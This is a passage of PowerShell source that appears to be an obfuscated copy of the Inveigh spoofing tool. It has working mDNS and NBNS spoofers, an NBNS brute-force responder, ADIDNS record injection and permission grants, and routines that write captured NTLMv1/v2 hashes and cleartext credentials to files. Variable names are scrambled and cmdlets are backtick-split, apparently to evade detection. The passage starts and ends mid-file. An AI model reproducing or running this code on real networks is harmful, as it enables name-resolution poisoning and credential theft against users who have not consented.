                $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $MarkMatter.Client.Bind($YamGuitar)
                $PassCoil = [IPAddress]"224.0.0.252"
                $MarkMatter.JoinMulticastGroup($PassCoil)
                $MarkMatter.Client.ReceiveTimeout = 5000
            }
        
            if($SixTrade)
            {
                $LightOval.output_queue.Add("$LooseMarked [$(Get-Date -format s)] LLMNR request for $BeamWild received from $StuffSky $StitchYak") > $null
            }

            $SixTrade = $null
        }

    }

    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
    $MarkMatter.Close()
 }

# Microsoft".
$SleetGrip = 
{
    param ($MeekSmoggy,$MurderOffer,$WantLittle,$StickLame,$BikeLoud,$HoleRoute,$WoozyClose,$ObeyAttack)

    $VisitShaky = $true
    $WailWooden = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5353)

    try
    {
        $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
        $BanSteel.ExclusiveAddressUse = $false
        $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $BanSteel.Client.Bind($WailWooden)

    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $VisitShaky = $false
    }

    $ShrugWicked = [IPAddress]"224.0.0.251"
    $BanSteel.JoinMulticastGroup($ShrugWicked)
    $BanSteel.Client.ReceiveTimeout = 5000
    $PourDesign = [System.BitConverter]::GetBytes($MurderOffer)
    [Array]::Reverse($PourDesign)

    while($LightOval.running -and $VisitShaky)
    {   

        try
        {
            $SeaJuice = $BanSteel.Receive([Ref]$WailWooden)
        }
        catch
        {
            $BanSteel.Close()
            $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
            $BanSteel.ExclusiveAddressUse = $false
            $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $BanSteel.Client.Bind($WailWooden)
            $ShrugWicked = [IPAddress]"224.0.0.251"
            $BanSteel.JoinMulticastGroup($ShrugWicked)
            $BanSteel.Client.ReceiveTimeout = 5000
        }

        if(([System.BitConverter]::ToString($SeaJuice)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($SeaJuice[4..11]) -eq "00-01-00-00-00-00-00-00")
        {
            $StuffSky = $WailWooden.Address
            $FuelMate = Get-NameQueryString 12 $SeaJuice
            $ClubSave = ($FuelMate.Split("."))[0]
            $FriendSquare = "[+]"

            $CureGood = $SeaJuice[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $SeaJuice[12..($FuelMate.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $PourDesign +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
            
            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QU" -GustyDance $BoilClever
            $FriendSquare = $BabyFlap[0]
            $BabyFlap = $BabyFlap[1]

            if($BabyFlap -eq '[response sent]')
            {
                $SlipChess = ne`w-`obje`ct Net.IPEndpoint($WailWooden.Address,$WailWooden.Port)
                $BanSteel.Connect($SlipChess)
                $BanSteel.Send($CureGood,$CureGood.Length)
                $BanSteel.Close()
                $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
                $BanSteel.ExclusiveAddressUse = $false
                $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $BanSteel.Client.Bind($WailWooden)
                $ShrugWicked = [IPAddress]"224.0.0.251"
                $BanSteel.JoinMulticastGroup($ShrugWicked)
                $BanSteel.Client.ReceiveTimeout = 5000
            }
        
            if($SeaJuice)
            {
                $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QU) request $FuelMate received from $StuffSky $BabyFlap") > $null
            }

            $SeaJuice = $null
        }
        elseif(([System.BitConverter]::ToString($SeaJuice)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
            $SeaJuice[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($SeaJuice[4..11]) -eq "00-02-00-00-00-00-00-00"))
        {
            $StuffSky = $WailWooden.Address
            $FuelMate = Get-NameQueryString 12 $SeaJuice
            $ClubSave = ($FuelMate.Split("."))[0]
            $FriendSquare = "[+]"

            $CureGood = $SeaJuice[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $SeaJuice[12..($FuelMate.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $PourDesign +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()        
                
            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QM" -GustyDance $BoilClever
            $FriendSquare = $BabyFlap[0]
            $BabyFlap = $BabyFlap[1]

            if($BabyFlap -eq '[response sent]')
            {
                $SlipChess = ne`w-`obje`ct Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                $BanSteel.Connect($SlipChess)
                $BanSteel.Send($CureGood,$CureGood.Length)
                $BanSteel.Close()
                $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient 5353
                $ShrugWicked = [IPAddress]"224.0.0.251"
                $BanSteel.JoinMulticastGroup($ShrugWicked)
                $BanSteel.Client.ReceiveTimeout = 5000
            }

            if($SeaJuice)                   
            {
                $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QM) request $FuelMate received from $StuffSky $BabyFlap") > $null
            }

            $SeaJuice = $null
        }

    }

    $BanSteel.Close()
}

# Microsoft".
$YokeInjure = 
{
    param ($MeekSmoggy,$SmashDolls,$BlushCattle,$ThawMiddle,$StickLame,$HoleRoute,$BikeLoud,
        $ObeyAttack,$WoozyClose,$JokeFaulty)

    $OneStop = $true
    $CactusSilver = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Broadcast,137)

    try
    {
        $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
    }
    catch
    {
        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $OneStop = $false
    }

    $HollowSquash.Client.ReceiveTimeout = 5000
    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
    [Array]::Reverse($BaitWound)

    while($LightOval.running -and $OneStop)
    {
        
        try
        {
            $TugUntidy = $HollowSquash.Receive([Ref]$CactusSilver)
        }
        catch
        {
            $HollowSquash.Close()
            $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
            $HollowSquash.Client.ReceiveTimeout = 5000
        }

        if($TugUntidy -and [System.BitConverter]::ToString($TugUntidy[10..11]) -ne '00-01')
        {
            $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
            [Array]::Reverse($BaitWound)

            $KindChess = $TugUntidy[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    $TugUntidy[13..$TugUntidy.Length] +
                                    $BaitWound +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes() +
                                    0x00,0x00,0x00,0x00

            $StuffSky = $CactusSilver.Address
            $HealthIcy = [System.BitConverter]::ToString($TugUntidy[43..44])
            $HealthIcy = Get-NeedleSoak $HealthIcy
            $ScarceSlow = $TugUntidy[47]
            $GaudyArgue = "[+]"
            $RhymeTaste = [System.BitConverter]::ToString($TugUntidy[13..($TugUntidy.Length - 4)])
            $RhymeTaste = $RhymeTaste -replace "-00",""
            $RhymeTaste = $RhymeTaste.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $UltraFail = ne`w-`obje`ct System.String ($RhymeTaste,0,$RhymeTaste.Length)
            $SkinInnate = $UltraFail
            $UltraFail = $UltraFail.Substring(0,$UltraFail.IndexOf("CA"))
            $WiseWool = $null
            $DuckElbow = $null
            $PluckyIce = 0
                            
            do
            {
                $UntidyCake = (([Byte][Char]($UltraFail.Substring($PluckyIce,1))) - 65)
                $WiseWool += ([System.Convert]::ToString($UntidyCake,16))
                $PluckyIce += 1
            }
            until($PluckyIce -ge ($UltraFail.Length))
                    
            $PluckyIce = 0
                    
            do
            {
                $DuckElbow += ([Char]([System.Convert]::ToInt16($WiseWool.Substring($PluckyIce,2),16)))
                $PluckyIce += 2
            }
            until($PluckyIce -ge ($WiseWool.Length) -or $DuckElbow.Length -eq 15)

            if($SkinInnate.StartsWith("ABAC") -and $SkinInnate.EndsWith("ACAB"))
            {
                $DuckElbow = $DuckElbow.Substring(2)
                $DuckElbow = $DuckElbow.Substring(0, $DuckElbow.Length - 1)
                $DuckElbow = "<01><02>" + $DuckElbow + "<02>"
            }

            if($DuckElbow -notmatch '[^\x00-\x7F]+')
            {

                if(!$LightOval.request_table.ContainsKey($DuckElbow))
                {
                    $LightOval.request_table.Add($DuckElbow.ToLower(),[Array]$StuffSky.IPAddressToString)
                    $LightOval.request_table_updated = $true
                }
                else
                {
                    $LightOval.request_table.$DuckElbow += $StuffSky.IPAddressToString
                    $LightOval.request_table_updated = $true
                }

            }
            
            $TidyIron = Get-SpooferResponseMessage -ExpectRitzy $DuckElbow -EarBucket "NBNS" -GustyDance $PeckFirst -PiesDesk $ScarceSlow
            $GaudyArgue = $TidyIron[0]
            $TidyIron = $TidyIron[1]

            if($TidyIron -eq '[response sent]')
            {
                $EndGuitar = ne`w-`obje`ct System.Net.IPEndpoint($CactusSilver.Address,$CactusSilver.Port)
                $HollowSquash.Connect($EndGuitar)
                $HollowSquash.Send($KindChess,$KindChess.Length)
                $HollowSquash.Close()
                $HollowSquash = ne`w-`obje`ct System.Net.Sockets.UdpClient 137
                $HollowSquash.Client.ReceiveTimeout = 5000
            }

            if($TugUntidy)                   
            {
                $LightOval.output_queue.Add("$GaudyArgue [$(Get-Date -format s)] NBNS request $DuckElbow<$HealthIcy> received from $StuffSky $TidyIron") > $null    
            }

            $TugUntidy = $null
        }

    }

    $HollowSquash.Close()
 }

# Microsoft".
$KickWord = 
{
    param ($DelayValue,$MournMean,$NorthLumpy,$BlushCattle,$StickLame)
   
    $DelayValue = $DelayValue.ToUpper()

    $HillHappen = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    $OilSilk = [System.Text.Encoding]::UTF8.GetBytes($DelayValue)
    $OilSilk = [System.BitConverter]::ToString($OilSilk)
    $OilSilk = $OilSilk.Replace("-","")
    $OilSilk = [System.Text.Encoding]::UTF8.GetBytes($OilSilk)
    $BaitWound = [System.BitConverter]::GetBytes($BlushCattle)
    [Array]::Reverse($BaitWound)

    for($ColorReply=0; $ColorReply -lt $OilSilk.Count; $ColorReply++)
    {

        if($OilSilk[$ColorReply] -gt 64)
        {
            $HillHappen[$ColorReply] = $OilSilk[$ColorReply] + 10
        }
        else
        {
            $HillHappen[$ColorReply] = $OilSilk[$ColorReply] + 17
        }
    
    }

    $KindChess = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            $HillHappen +
                            0x00,0x20,0x00,0x01 +
                            $BaitWound +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes() +
                            0x00,0x00,0x00,0x00

    $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Starting NBNS brute force spoofer to resolve $DelayValue on $NorthLumpy") > $null
    $CannonRose = $false          
    $GrubbyPast = ne`w-`obje`ct System.Net.Sockets.UdpClient(137)
    $BattleSalt = [System.Net.IPAddress]::Parse($NorthLumpy)
    $UnableIcy = ne`w-`obje`ct Net.IPEndpoint($BattleSalt,137)
    $GrubbyPast.Connect($UnableIcy)
       
    while($LightOval.running)
    {

        :NBNS_spoofer_loop while (!$LightOval.hostname_spoof -and $LightOval.running)
        {

            if($CannonRose)
            {
                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Resuming NBNS brute force spoofer") > $null
                $CannonRose = $false
            }

            for ($ColorReply = 0; $ColorReply -lt 255; $ColorReply++)
            {

                for ($WindyEarth = 0; $WindyEarth -lt 255; $WindyEarth++)
                {
                    $KindChess[0] = $ColorReply
                    $KindChess[1] = $WindyEarth                 
                    $GrubbyPast.send($KindChess,$KindChess.Length)

                    if($LightOval.hostname_spoof -and $MournMean)
                    {
                        $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Pausing NBNS brute force spoofer") > $null
                        $CannonRose = $true
                        break NBNS_spoofer_loop
                    }
                
                }
            
            }
        
        }

        Start-Sleep -m 5
    }

    $GrubbyPast.Close()
}

# Microsoft".
$ErectJog =
{
    param ($HeatIll,$CuteGroup,[System.Management.Automation.PSCredential]$BlackFilthy,$TrapJoin,
        $KnownFood,$StoryFurry,$LiveSedate,$BouncyEven,$ShinyAunt,$ViewNice,
        $IceFix,$FarDry,$FullGrin,$FailDad,$DressGround,$MournMean,
        $MatterOffice,$GrowthWind,$StickLame)

    function Invoke-OutputQueueLoop
    {

        while($LightOval.output_queue.Count -gt 0)
        {
            $LightOval.console_queue.Add($LightOval.output_queue[0]) > $null

            if($LightOval.file_output)
            {
                
                if ($LightOval.output_queue[0].StartsWith("[+] ") -or $LightOval.output_queue[0].StartsWith("[*] ") -or $LightOval.output_queue[0].StartsWith("[!] ") -or $LightOval.output_queue[0].StartsWith("[-] "))
                {
                    $LightOval.log_file_queue.Add($LightOval.output_queue[0]) > $null
                }
                else
                {
                    $LightOval.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($LightOval.log_output)
            {
                $LightOval.log.Add($LightOval.output_queue[0]) > $null
            }

            $LightOval.output_queue.RemoveAt(0)
        }

    }

    function Stop-InveighRunspace
    {
        param ([String]$MeddlePart)
        
        if($LightOval.HTTPS -and !$LightOval.HTTPS_existing_certificate -or ($LightOval.HTTPS_existing_certificate -and $LightOval.HTTPS_force_certificate_delete))
        {

            try
            {
                $FoundCave = ne`w-`obje`ct System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $FoundCave.Open('ReadWrite')
                $FoundTurkey = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $LightOval.certificate_issuer})

                foreach($DollsRound in $FoundTurkey)
                {
                    $FoundCave.Remove($DollsRound)
                }

                $FoundCave.Close()
            }
            catch
            {
                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }

        }

        if($CuteGroup -eq 'Y' -and $LightOval.ADIDNS_table.Count -gt 0)
        {
            [Array]$BaseDapper = $LightOval.ADIDNS_table.Keys

            foreach($KnottyHelp in $BaseDapper)
            {
                
                if($LightOval.ADIDNS_table.$KnottyHelp -ge 1)
                {

                    try
                    {
                        Disable-ADIDNSNode -Credential $BlackFilthy -DesireUnique $TrapJoin -TrickWander $KnownFood -FilmJazzy $KnottyHelp -CauseYoke $ViewNice -PersonCheer $FullGrin
                        $LightOval.ADIDNS_table.$KnottyHelp = $null
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $KnottyHelp remove failed") > $null
                    }

                }

            }

        }
        
        if($LightOval.relay_running)
        {
            Start-Sleep -m 100

            if($MeddlePart)
            {
                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $MeddlePart") > $null
            }
            else
            {
                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }

            if(!$LightOval.running)
            {
                Invoke-OutputQueueLoop
                Start-Sleep -m 100
            }

            $LightOval.relay_running = $false
        }

        if($LightOval.running)
        {

            if($MeddlePart)
            {
                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $MeddlePart") > $null
            }
            else
            {
                $LightOval.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }

            Invoke-OutputQueueLoop

            if(!$DressGround)
            {
                Start-Sleep -PlantsIrate 3
            }

            $LightOval.running = $false
        }

        $LightOval.ADIDNS = $null
        $LightOval.HTTPS = $false
    }

    if($LightOval.ADIDNS -contains 'Wildcard')
    {
        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy '*' -CauseYoke $ViewNice -EarBucket 'A'-LethalArrive $FarDry -PersonCheer $FullGrin
    }

    if($LightOval.ADIDNS -contains 'NS')
    {

        if($ShinyAunt.EndsWith($FullGrin))
        {
            $UnableSteer = $ShinyAunt
            $ShinyAunt = $ShinyAunt -replace ".$FullGrin",''
        }
        else
        {
            $UnableSteer = $ShinyAunt + "." + $FullGrin
        }

        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy $ShinyAunt -CauseYoke $ViewNice -EarBucket 'A' -LethalArrive $FarDry -PersonCheer $FullGrin
        Invoke-ADIDNSSpoofer -Credential $BlackFilthy -IckyBloody $UnableSteer -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -FilmJazzy $BouncyEven -CauseYoke $ViewNice -EarBucket 'NS' -LethalArrive $FarDry -PersonCheer $FullGrin
    }

    if($MournMean)
    {   
        $BloodDeath = New-TimeSpan -Seconds $MournMean
    }

    $DrunkDivide = $MatterOffice + $LightOval.NTLMv1_list.Count
    $FloatRecord = $MatterOffice + $LightOval.NTLMv2_list.Count
    $SomberPet = $MatterOffice + $LightOval.cleartext_list.Count

    if($GrowthWind)
    {    
        $TorpidStupid = New-TimeSpan -Minutes $GrowthWind
        $SeemlyLamp = [System.Diagnostics.Stopwatch]::StartNew()
    }

    while($LightOval.running)
    {

        if($MournMean -and $LightOval.hostname_spoof)
        {
         
            if($LightOval.NBNS_stopwatch.Elapsed -ge $BloodDeath)
            {
                $LightOval.hostname_spoof = $false
            }
        
        }

        if($MatterOffice)
        {
            
            if($LightOval.NTLMv1_list.Count -ge $DrunkDivide -or $LightOval.NTLMv2_list.Count -ge $FloatRecord -or $LightOval.cleartext_list.Count -ge $SomberPet)
            {
                Stop-InveighRunspace "reaching run count"           
            }

        }

        if($GrowthWind)
        {

            if($SeemlyLamp.Elapsed -ge $TorpidStupid)
            {
                Stop-InveighRunspace "reaching run time"
            }

        }

        if($LightOval.ADIDNS -contains 'Combo' -and $LightOval.request_table_updated)
        {
            
            try
            {
                Invoke-ADIDNSCheck -Credential $BlackFilthy -IckyBloody $StickLame -DesireUnique $TrapJoin -TrickWander $KnownFood -RipeYoke $StoryFurry -MuscleFair $LiveSedate -CauseYoke $ViewNice -IrateAnimal $LightOval.request_table -DrainCable $IceFix -LethalArrive $FarDry -PersonCheer $FullGrin
            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            }

            $LightOval.request_table_updated = $false
        }

        if($LightOval.ADIDNS -and $LightOval.ADIDNS_table.Count -gt 0)
        {
            [Array]$BaseDapper = $LightOval.ADIDNS_table.Keys

            foreach($KnottyHelp in $BaseDapper)
            {
                
                if($LightOval.ADIDNS_table.$KnottyHelp -eq 1)
                {

                    try
                    {
                        Grant-ADIDNSPermission -Credential $BlackFilthy -DesireUnique $TrapJoin -TrickWander $KnownFood -FilmJazzy $KnottyHelp -PiesLearn 'Authenticated Users'-PersonCheer $FullGrin
                        $LightOval.ADIDNS_table.$KnottyHelp = 2
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $KnottyHelp failed") > $null
                    }

                }

            }

        }

        if($LightOval.file_output)
        {

            while($LightOval.log_file_queue.Count -gt 0)
            {
                $LightOval.log_file_queue[0]|`out-fi`le $LightOval.log_out_file -Append
                $LightOval.log_file_queue.RemoveAt(0)
            }

            while($LightOval.NTLMv1_file_queue.Count -gt 0)
            {
                $LightOval.NTLMv1_file_queue[0]|`out-fi`le $LightOval.NTLMv1_out_file -Append
                $LightOval.NTLMv1_file_queue.RemoveAt(0)
            }

            while($LightOval.NTLMv2_file_queue.Count -gt 0)
            {
                $LightOval.NTLMv2_file_queue[0]|`out-fi`le $LightOval.NTLMv2_out_file -Append
                $LightOval.NTLMv2_file_queue.RemoveAt(0)
            }

            while($LightOval.cleartext_file_queue.Count -gt 0)
            {
                $LightOval.cleartext_file_queue[0]|`out-fi`le $LightOval.cleartext_out_file -Append
                $LightOval.cleartext_file_queue.RemoveAt(0)
            }

            while($LightOval.POST_request_file_queue.Count -gt 0)
            {
                $LightOval.POST_request_file_queue[0]|`out-fi`le $LightOval.POST_request_out_file -Append
                $LightOval.POST_request_file_queue.RemoveAt(0)
            }

        }

        if(!$LightOval.console_output -and $FailDad -ge 0)
        {

            while($LightOval.console_queue.Count -gt $FailDad -and !$LightOval.console_output)
            {
                $LightOval.console_queue.RemoveAt(0)
            }

        }

        if(!$LightOval.status_output)
        {
            Invoke-OutputQueueLoop
        }

        Start-Sleep -m 5
        
        if($LightOval.stop)
        {
            $LightOval.console_queue.Clear()
            Stop-InveighRunspace
        }

    }

}

# Microsoft".
# Microsoft".

# Microsoft".
function HTTPListener
{
    $SufferRefuse = $false
    $HugeDead = $false
    $StageRhyme = [RunspaceFactory]::CreateRunspace()
    $StageRhyme.Open()
    $StageRhyme.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $FogInsect = [PowerShell]::Create()
    $FogInsect.Runspace = $StageRhyme
    $FogInsect.AddScript($LivelySqueak) > $null
    $FogInsect.AddScript($UppitySheep) > $null
    $FogInsect.AddScript($OrangeMushy) > $null
    $FogInsect.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
        $SwingHorses).AddArgument($RightSnail).AddArgument($LunchCheat).AddArgument(
        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
    $FogInsect.BeginInvoke() > $null
}

Start-Sleep -m 50

# Microsoft".
function HTTPSListener
{
    $SufferRefuse = $false
    $HugeDead = $true
    $CrownRing = [RunspaceFactory]::CreateRunspace()
    $CrownRing.Open()
    $CrownRing.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $TryThin = [PowerShell]::Create()
    $TryThin.Runspace = $CrownRing
    $TryThin.AddScript($LivelySqueak) > $null
    $TryThin.AddScript($UppitySheep) > $null
    $TryThin.AddScript($OrangeMushy) > $null
    $TryThin.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
        $SwingHorses).AddArgument($RightSnail).AddArgument($HarmFruit).AddArgument(
        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
    $TryThin.BeginInvoke() > $null
}

Start-Sleep -m 50

# Microsoft".
function ProxyListener
{
    $SufferRefuse = $true
    $HugeDead = $false
    $RetireMonkey = [RunspaceFactory]::CreateRunspace()
    $RetireMonkey.Open()
    $RetireMonkey.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $BlushLiquid = [PowerShell]::Create()
    $BlushLiquid.Runspace = $RetireMonkey
    $BlushLiquid.AddScript($LivelySqueak) > $null
    $BlushLiquid.AddScript($UppitySheep) > $null
    $BlushLiquid.AddScript($OrangeMushy) > $null
    $BlushLiquid.AddScript($SwimChief).AddArgument($HeavySmall).AddArgument($HeapDetect).AddArgument(
        $KindLick).AddArgument($MilkyCelery).AddArgument($LearnHelp).AddArgument(
        $OrangeDog).AddArgument($SkirtStone).AddArgument($SuperbBlood).AddArgument(
        $SwingHorses).AddArgument($PreachBad).AddArgument($OafishAllow).AddArgument(
        $BadgeKind).AddArgument($StewLean).AddArgument($YummyShame).AddArgument(
        $YawnOdd).AddArgument($HugeDead).AddArgument($SmashDolls).AddArgument($MournMean).AddArgument(
        $SilkySmelly).AddArgument($JumpyWrench).AddArgument($ExpandNest).AddArgument($SufferRefuse).AddArgument(
        $LoadTrade).AddArgument($RobustFail).AddArgument($ReasonTrust) > $null
    $BlushLiquid.BeginInvoke() > $null
}

# Microsoft".
function SnifferSpoofer
{
    $MachoWise = [RunspaceFactory]::CreateRunspace()
    $MachoWise.Open()
    $MachoWise.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $MatchDog = [PowerShell]::Create()
    $MatchDog.Runspace = $MachoWise
    $MatchDog.AddScript($LivelySqueak) > $null
    $MatchDog.AddScript($UppitySheep) > $null
    $MatchDog.AddScript($OrangeMushy) > $null
    $MatchDog.AddScript($SuckFaded) > $null
    $MatchDog.AddScript($InnatePrefer).AddArgument($HomelyShow).AddArgument($HandsHop).AddArgument(
        $BootShrill).AddArgument($MeekSmoggy).AddArgument($SmashDolls).AddArgument($HeapDetect).AddArgument($KindLick).AddArgument(
        $MilkyCelery).AddArgument($LearnHelp).AddArgument($LipMeat).AddArgument(
        $TeaseNasty).AddArgument($BoilClever).AddArgument($WantLittle).AddArgument($MurderOffer).AddArgument($PeckFirst).AddArgument(
        $BlushCattle).AddArgument($ThawMiddle).AddArgument($SilkySmelly).AddArgument($SlimyCable).AddArgument(
        $BreezyDesign).AddArgument($FairAblaze).AddArgument($NorthAmuck).AddArgument($HoleRoute).AddArgument(
        $BikeLoud).AddArgument($StickLame).AddArgument($ObeyAttack).AddArgument(
        $WoozyClose).AddArgument($PlugTour).AddArgument($SmokeFang).AddArgument(
        $WrongAnts).AddArgument($JokeFaulty).AddArgument(
        $OwnBump).AddArgument($SameSneaky) > $null
    $MatchDog.BeginInvoke() > $null
}

# Microsoft".
function DNSSpoofer
{
    $MetalCellar = [RunspaceFactory]::CreateRunspace()
    $MetalCellar.Open()
    $MetalCellar.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $PlantsArch = [PowerShell]::Create()
    $PlantsArch.Runspace = $MetalCellar
    $PlantsArch.AddScript($LivelySqueak) > $null
    $PlantsArch.AddScript($PressScream).AddArgument($MeekSmoggy).AddArgument(
        $HandsHop).AddArgument($StickLame) > $null
    $PlantsArch.BeginInvoke() > $null
}

# Microsoft".
function LLMNRSpoofer
{
    $GazeVoice = [RunspaceFactory]::CreateRunspace()
    $GazeVoice.Open()
    $GazeVoice.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $MissSnow = [PowerShell]::Create()
    $MissSnow.Runspace = $GazeVoice
    $MissSnow.AddScript($LivelySqueak) > $null
    $MissSnow.AddScript($UsedMice).AddArgument($MeekSmoggy).AddArgument(
        $TeaseNasty).AddArgument($StickLame).AddArgument($BikeLoud).AddArgument(
        $HoleRoute).AddArgument($WoozyClose).AddArgument(
        $ObeyAttack).AddArgument($JokeFaulty) > $null
    $MissSnow.BeginInvoke() > $null
}

# Microsoft".
function mDNSSpoofer
{
    $SpySteer = [RunspaceFactory]::CreateRunspace()
    $SpySteer.Open()
    $SpySteer.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $JazzySedate = [PowerShell]::Create()
    $JazzySedate.Runspace = $SpySteer
    $JazzySedate.AddScript($LivelySqueak) > $null
    $JazzySedate.AddScript($SleetGrip).AddArgument($MeekSmoggy).AddArgument(
        $MurderOffer).AddArgument($WantLittle).AddArgument($StickLame).AddArgument($BikeLoud).AddArgument(
        $HoleRoute).AddArgument($WoozyClose).AddArgument($ObeyAttack) > $null
    $JazzySedate.BeginInvoke() > $null
}

# Microsoft".
function NBNSSpoofer
{
    $BloodyGirl = [RunspaceFactory]::CreateRunspace()
    $BloodyGirl.Open()
    $BloodyGirl.SessionStateProxy.SetVariable('inveigh',$LightOval)
    $EyesNorth = [PowerShell]::Create()
    $EyesNorth.Runspace = $BloodyGirl
    $EyesNorth.AddScript($LivelySqueak) > $null
